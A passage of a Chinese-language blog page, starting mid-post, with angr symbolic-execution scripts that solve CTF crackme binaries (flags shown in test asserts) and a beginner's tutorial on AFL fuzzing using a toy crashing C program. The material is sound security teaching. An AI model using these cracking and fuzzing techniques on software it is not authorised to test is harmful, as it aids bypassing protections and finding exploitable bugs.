10)</span><br><span class="line"></span><br><span class="line">    # Reset the symbolic stdin&apos;s properties and set its length.</span><br><span class="line">    st.posix.files[0].seek(0)</span><br><span class="line">    st.posix.files[0].length = 29</span><br><span class="line"></span><br><span class="line">    # Construct a SimulationManager to perform symbolic execution.</span><br><span class="line">    # Step until there is nothing left to be stepped.</span><br><span class="line">    sm = p.factory.simgr(st)</span><br><span class="line">    sm.run()</span><br><span class="line"></span><br><span class="line">    # Get the stdout of every path that reached an exit syscall. The flag should be in one of these!</span><br><span class="line">    out = &apos;&apos;</span><br><span class="line">    for pp in sm.deadended:</span><br><span class="line">        out = pp.posix.dumps(1)</span><br><span class="line">        if &apos;flag&#123;&apos; in out:</span><br><span class="line">            return filter(lambda s: &apos;flag&#123;&apos; in s, out.split())[0]</span><br><span class="line"></span><br><span class="line">    # Runs in about 15 minutes!</span><br><span class="line"></span><br><span class="line">def test():</span><br><span class="line">    assert main() == &apos;flag&#123;dr4g0n_or_p4tric1an_it5_LLVM&#125;&apos;</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    before = time.time()</span><br><span class="line">    print main()</span><br><span class="line">    after = time.time()</span><br><span class="line">    print &quot;Time elapsed: &#123;&#125;&quot;.format(after - before)</span><br></pre></td></tr></table></figure>

<p>从40行到51行，表示程序从标准输入读取数据，最后加上一个回车换行</p>
<h4 id="程序直接参数中读取参数"><a href="#程序直接参数中读取参数" class="headerlink" title="程序直接参数中读取参数"></a>程序直接参数中读取参数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">ais3_crackme has been developed by Tyler Nighswander (tylerni7) for ais3.</span><br><span class="line">It is an easy crackme challenge. It checks the command line argument.</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">import angr</span><br><span class="line">import claripy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    project = angr.Project(&quot;./ais3_crackme&quot;)</span><br><span class="line"></span><br><span class="line">    #create an initial state with a symbolic bit vector as argv1</span><br><span class="line">    argv1 = claripy.BVS(&quot;argv1&quot;,100*8) #since we do not the length now, we just put 100 bytes</span><br><span class="line">    initial_state = project.factory.entry_state(args=[&quot;./crackme1&quot;,argv1])</span><br><span class="line"></span><br><span class="line">    #create a path group using the created initial state</span><br><span class="line">    sm = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">    #symbolically execute the program until we reach the wanted value of the instruction pointer</span><br><span class="line">    sm.explore(find=0x400602) #at this instruction the binary will print the &quot;correct&quot; message</span><br><span class="line"></span><br><span class="line">    found = sm.found[0]</span><br><span class="line">    #ask to the symbolic solver to get the value of argv1 in the reached state as a string</span><br><span class="line">    solution = found.se.eval(argv1, cast_to=str)</span><br><span class="line"></span><br><span class="line">    print repr(solution)</span><br><span class="line">    solution = solution[:solution.find(&quot;\x00&quot;)]</span><br><span class="line">    print solution</span><br><span class="line">    return solution</span><br><span class="line"></span><br><span class="line">def test():</span><br><span class="line">    res = main()</span><br><span class="line">    assert res == &quot;ais3&#123;I_tak3_g00d_n0t3s&#125;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    print(repr(main()))</span><br></pre></td></tr></table></figure>

<p>导入clarify，然后引入参数argv1 = claripy.BVS(“argv1”,100*8)，再传到程序中。</p>
<h4 id="Angr执行与angr状态"><a href="#Angr执行与angr状态" class="headerlink" title="Angr执行与angr状态"></a>Angr执行与angr状态</h4><p>在 Angr 寻找路径时，程序的当前状态有多种表示。</p>
<ol>
<li>step()表示向下执行一个block（42bytes），step()函数产生active状态，表示该分支在执行中；</li>
<li>run()表示运行到结束，run()函数产生deadended状态，表示分支结束；</li>
<li>explore()可以对地址进行限制以减少符号执行遍历的路径。例如  sm.explore(find=0x400676,avoid=[0x40073d])  explore()产生found状态，表示探索的结果等等</li>
</ol>
<h4 id="Angr模板"><a href="#Angr模板" class="headerlink" title="Angr模板"></a>Angr模板</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import angr</span><br><span class="line">import sys</span><br><span class="line">print &quot;[*]start------------------------------------&quot;</span><br><span class="line">p = angr.Project(sys.argv[1])  # 建立工程初始化二进制文件</span><br><span class="line">state = p.factory.entry_state() # 获取入口点处状态</span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">state.posix.files[0].read_from(1)   表示从标准输入读取一个字节</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">for _ in xrange(int(sys.argv[2])):  # 对输入进行简单约束（不为回车）</span><br><span class="line">    k = state.posix.files[0].read_from(1)</span><br><span class="line">    state.se.add(k!=10)</span><br><span class="line"></span><br><span class="line">k = state.posix.files[0].read_from(1)</span><br><span class="line">state.se.add(k==10)  # 回车为结束符</span><br><span class="line"></span><br><span class="line">state.posix.files[0].seek(0)</span><br><span class="line">state.posix.files[0].length = int(sys.argv[2])+1 # 约束输入长度（大于实际长度也可）</span><br><span class="line"></span><br><span class="line">print &quot;[*]simgr start-------------------------------&quot;</span><br><span class="line"></span><br><span class="line">sm = p.factory.simgr(state)   # 初始化进程模拟器</span><br><span class="line">sm.explore(find=lambda s:&quot;correct!&quot; in s.posix.dumps(1)) # 寻找运行过程中存在 “correct！”的路径，并丢弃其他路径</span><br><span class="line">print &quot;[*]program excuted---------------------------&quot;</span><br><span class="line"></span><br><span class="line">for pp in sm.found:</span><br><span class="line">    out = pp.posix.dumps(1)   # 表示程序的输出</span><br><span class="line">    print out</span><br><span class="line">    inp = pp.posix.files[0].all_bytes()  # 取输入的变量</span><br><span class="line">    print pp.solver.eval(inp,cast_to = str)  # 利用约束求解引擎求解输入</span><br></pre></td></tr></table></figure>

<p>从命令行读取参数模板，参照第三个例子</p>
<h4 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h4><p>sm.run 最后我们去sm.deadended中去寻找结果。</p>
<p>sm.explore(find=find_addr, avoid=avoid_addr)  最后我们去sm.found去寻找结果。</p>
<blockquote>
<p>find_addr 可以是 list or tuple eg： find_addr=(0xdeadbeaa, 0xdeadbeaf)</p>
</blockquote>
<blockquote>
<p>avoid_addr 也可以是 list or tuple eg： avoid_addr=(0xdeadbeab, 0xdeadbead)</p>
</blockquote>
<p>为程序加速可以使用不同的选项如 auto_load_libs  or add_options=angr.options.unicorn等</p>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://idongxia.github.io/2018/01/13/AFL/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="idongxia">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="idongxia">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2018/01/13/AFL/" class="post-title-link" itemprop="url">Finding bugs using AFL</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              

              
                
              

              <time title="Erstellt: 2018-01-13 12:00:00" itemprop="dateCreated datePublished" datetime="2018-01-13T12:00:00+08:00">2018-01-13</time>
            

            
          </span>

          

          
            
            
              
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
            
                <span class="post-meta-item-text">Kommentare: </span>
                <a href="/2018/01/13/AFL/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2018/01/13/AFL/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="AFL"><a href="#AFL" class="headerlink" title="AFL"></a>AFL</h1><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>AFL号称是当前最高级的Fuzzing测试工具之一，由lcamtuf所开发。在众多安全会议白帽演讲中都介绍过这款工具，以及2016年defcon大会的CGC(Cyber  Grand Challenge，形式为机器自动挖掘并修补漏洞)大赛中多支队伍利用AFL fuzzing技术与符号执行(Symbolic  Execution)来实现漏洞挖掘，其中参赛队伍shellphish便是采用AFL(Fuzzing) + angr(Symbolic  Execution)技术。</p>
<p>AFLFuzzing工作原理：通过对源码进行重新编译时进行插桩（简称编译时插桩）的方式自动产生测试用例来探索二进制程序内部新的执行路径。</p>
<p>与其他基于插桩技术的fuzzers相比，afl-fuzz具有较低的性能消耗，有各种高效的fuzzing策略和tricks最小化技巧，  不需要先行复杂的配置，能无缝处理复杂的现实中的程序。当然AFL也支持直接对没有源码的二进制程序进行测试，但需要QEMU的支持。</p>
<p>本文主要是以入门使用为主，介绍如何使用AFL Fuzzing。</p>
<blockquote>
<p>CGC大赛主要利用技术包括：动态分析(Dynamic Analysis)、静态分析(Static  Analysis)、符号化执行(Symbolic Execution)、Constraint Solving、资讯流追踪技术(Data Flow  Tracking)以及自动化测试(Fuzz Testing)</p>
</blockquote>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ol>
<li>从<a href="http://lcamtuf.coredump.cx/afl/" target="_blank" rel="noopener">官网</a>下载最新版的<a href="http://lcamtuf.coredump.cx/afl/releases/afl-latest.tgz" target="_blank" rel="noopener">源码</a>（latest version），解压后进入所在目录。</li>
<li>执行以下命令进行编译和安装：     <ul>
<li>make</li>
<li>sudo make install</li>
</ul>
</li>
</ol>
<h2 id="AFL工作流程"><a href="#AFL工作流程" class="headerlink" title="AFL工作流程"></a>AFL工作流程</h2><h3 id="AFL工作原理简介"><a href="#AFL工作原理简介" class="headerlink" title="AFL工作原理简介"></a>AFL工作原理简介</h3><p>使用afl-gcc编译工程代码，然后以文件(尽量 &lt;1K)为输入，然后启动afl-fuzz程序，将testcase(seed)  喂给程序代码，然后程序接收此次输入执行程序，如果发现新的路径则保存此testcase到一个queue中，afl-fuzz继续编译testcase，因此程序每次接收不同的输入，如果程序崩溃，则记录crash。</p>
<blockquote>
<p>AFL设计思想在后续使用一篇文章介绍AFL特性与设计思想</p>
</blockquote>
<h3 id="AFL-Fuzzing步骤"><a href="#AFL-Fuzzing步骤" class="headerlink" title="AFL Fuzzing步骤"></a>AFL Fuzzing步骤</h3><ol>
<li>使用afl-gcc编译项目代码，将编译脚本中的CC=afl-gcc/CXX=afl-g++；</li>
<li>新建两个文件夹，如fuzz_in/fuzz_out,文件夹名随意；</li>
<li>将初始化testcase放到fuzz_in目录下；</li>
<li>执行afl-fuzz -i fuzz_in -o fuzz_out ./xxx @@   xxx为可执行程序名，@@表示从文件中读入</li>
<li>观察fuzzing结果，如有crash，定位问题。</li>
</ol>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int vuln(char *Data) &#123;</span><br><span class="line">//printf(&quot;Data Size is :%d\n&quot;, Size);</span><br><span class="line">int num = rand() % 100 + 1;</span><br><span class="line">//printf(&quot;num is %d\n&quot;, num);</span><br><span class="line">printf(&quot;Data is generated, num is %d\n&quot;, num);</span><br><span class="line">if(Data[0] == &apos;C&apos; &amp;&amp; num == 25)</span><br><span class="line">&#123;</span><br><span class="line">    raise(SIGSEGV);</span><br><span class="line">&#125;</span><br><span class="line">else if(Data[0] == &apos;F&apos; &amp;&amp; num == 90)</span><br><span class="line">&#123;</span><br><span class="line">    raise(SIGSEGV);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    printf(&quot;it is good!\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">char buf[40]=&#123;0&#125;;</span><br><span class="line">FILE *input = NULL;</span><br><span class="line">input = fopen(argv[1], &quot;r&quot;);</span><br><span class="line">if(input != 0)</span><br><span class="line">&#123;</span><br><span class="line">    fscanf(input, &quot;%s&quot;, &amp;buf);</span><br><span class="line">    printf(&quot;buf is %s\n&quot;, buf);</span><br><span class="line">    vuln(buf);</span><br><span class="line">    fclose(input);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;bad file!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>程序说明： 如果编译的数据第一个字母是’C’并且num=25 或者第一个字母是’F’并且num=90,那么程序异常退出。</p>
</blockquote>
<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>afl-gcc -g -o afl_test  afl_test.c</p>
<h3 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h3><ol>
<li>新建输入、输出文件夹： mkdir fuzz_in fuzz_out</li>
<li>准备初始化testcase, 将testcase内容随意写成aaa: echo aaa &gt; fuzz_in/testcase</li>
</ol>
<h3 id="开始Fuzzing"><a href="#开始Fuzzing" class="headerlink" title="开始Fuzzing"></a>开始Fuzzing</h3><p>afl-fuzz -i fuzz_in -o fuzz_out ./afl_test @@</p>
<p>启动afl-fuzz中往往会报错，表示某些环境变量没有配置或者配置错误，如<img src="/AFL/core.png" alt="core"> 没有打开错误转储机制，执行命令：</p>
<ul>
<li>sudo su</li>
<li>echo core &gt;/proc/sys/kernel/core_pattern</li>
</ul>
<blockquote>
<p>根据提示，修改或配置afl-fuzz options以及系统环境变量</p>
</blockquote>
<p>重新执行afl-fuzz -i fuzz_in -o fuzz_out ./afl_test @@ <img src="/AFL/core.png" alt="afl"></p>
<h3 id="定位crash"><a href="#定位crash" class="headerlink" title="定位crash"></a>定位crash</h3><ol>
<li>打开设定的fuzz_out目录，如下<img src="/AFL/out_dir.png" alt="out_dir"></li>
<li>打开crash目录，可以看到crash文件<img src="/AFL/crashes.png" alt="crashes"> 将crash文件用作输入可以使程序崩溃 ./afl_test fuzz_out/crashes/id:000002,sig:06,src:000002,op:havoc,rep:8 然后gdb调试即可</li>
</ol>
<h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>查看使程序崩溃的输入文件<img src="/AFL/file.png" alt="file">,可以查看文件内容,符合程序崩溃逻辑。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>此文章以简单的例子，是AFL Fuzzing工具跑起来，后续将深入分析AFL Fuzzing在实际项目中的应用。</p>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  


          </div>
          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">idongxia</p>
              <div class="site-description motion-element" itemprop="description"></div>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">7</span>
                    <span class="site-state-item-name">Artikel</span>
                  </a>
                </div>
              

              

              
            </nav>
          

          

          

          

          

          
          

          
            
          
          

        </div>
      </div>

      

      

    </div>
  </aside>
  


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">idongxia</span>

  

  
</div>


  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Design – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.1.2</div>




        








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

    

    
  </div>

  

<script>
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>


























  
  <script src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>


  


  <script src="/js/utils.js?v=7.1.2"></script>

  <script src="/js/motion.js?v=7.1.2"></script>



  
  


  <script src="/js/schemes/muse.js?v=7.1.2"></script>



  

  


  <script src="/js/next-boot.js?v=7.1.2"></script>


  

  

  

  
  

<script src="//cdn1.lncld.net/static/js/3.11.1/av-min.js"></script>



<script src="//unpkg.com/valine/dist/Valine.min.js"></script>

<script>
  var GUEST = ['nick', 'mail', 'link'];
  var guest = 'nick,mail,link';
  guest = guest.split(',').filter(function(item) {
    return GUEST.indexOf(item) > -1;
  });
  new Valine({
    el: '#comments',
    verify: false,
    notify: false,
    appId: 'utzKntLleFpYpbLMukFBuRNb-gzGzoHsz',
    appKey: 'QzvmcivNyJTepWaD1Fuwpuci',
    placeholder: 'Just go go',
    avatar: 'mm',
    meta: guest,
    pageSize: '10' || 10,
    visitor: false,
    lang: '' || 'zh-cn'
  });
</script>





  




  

  

  

  

  

  

  

  

  

  

  

  

  

  

</body>
</html>
